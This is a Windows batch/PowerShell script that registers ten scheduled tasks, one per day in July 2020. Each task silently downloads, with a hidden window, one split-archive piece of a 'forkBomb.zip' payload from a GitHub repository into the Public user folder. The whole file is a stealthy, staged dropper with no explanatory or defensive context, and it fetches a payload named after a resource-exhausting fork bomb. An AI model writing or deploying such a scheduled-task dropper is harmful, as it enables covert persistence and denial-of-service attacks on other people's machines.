@echo off
cd %Public%
powershell
$Time1 = New-ScheduledTaskTrigger -At "07/01/2020 00:00" -Once
$Time2 = New-ScheduledTaskTrigger -At "07/02/2020 00:00" -Once
$Time3 = New-ScheduledTaskTrigger -At "07/03/2020 00:00" -Once
$Time4 = New-ScheduledTaskTrigger -At "07/04/2020 00:00" -Once
$Time5 = New-ScheduledTaskTrigger -At "07/05/2020 00:00" -Once
$Time6 = New-ScheduledTaskTrigger -At "07/06/2020 00:00" -Once
$Time7 = New-ScheduledTaskTrigger -At "07/07/2020 00:00" -Once
$Time8 = New-ScheduledTaskTrigger -At "07/08/2020 00:00" -Once
$Time9 = New-ScheduledTaskTrigger -At "07/09/2020 00:00" -Once
$Time10 = New-ScheduledTaskTrigger -At "07/10/2020 00:00" -Once
$Download1 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.001','C:\Users\Public\forkBomb.zip.001')"
$Download2 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.002','C:\Users\Public\forkBomb.zip.002')"
$Download3 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.003','C:\Users\Public\forkBomb.zip.003')"
$Download4 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.004','C:\Users\Public\forkBomb.zip.004')"
$Download5 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.005','C:\Users\Public\forkBomb.zip.005')"
$Download6 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.006','C:\Users\Public\forkBomb.zip.006')"
$Download7 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.007','C:\Users\Public\forkBomb.zip.007')"
$Download8 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.008','C:\Users\Public\forkBomb.zip.008')"
$Download9 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.009','C:\Users\Public\forkBomb.zip.009')"
$Download10 = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle hidden (new-object System.Net.WebClient).DownloadFile('https://github.com/dsolisav/forkBomb/raw/master/forkBomb.zip.010','C:\Users\Public\forkBomb.zip.010')"
Register-ScheduledTask -TaskName "Part1" -Trigger $Time1 -Action $Download1
Register-ScheduledTask -TaskName "Part2" -Trigger $Time2 -Action $Download2
Register-ScheduledTask -TaskName "Part3" -Trigger $Time3 -Action $Download3
Register-ScheduledTask -TaskName "Part4" -Trigger $Time4 -Action $Download4
Register-ScheduledTask -TaskName "Part5" -Trigger $Time5 -Action $Download5
Register-ScheduledTask -TaskName "Part6" -Trigger $Time6 -Action $Download6
Register-ScheduledTask -TaskName "Part7" -Trigger $Time7 -Action $Download7
Register-ScheduledTask -TaskName "Part8" -Trigger $Time8 -Action $Download8
Register-ScheduledTask -TaskName "Part9" -Trigger $Time9 -Action $Download9
Register-ScheduledTask -TaskName "Part10" -Trigger $Time10 -Action $Download10
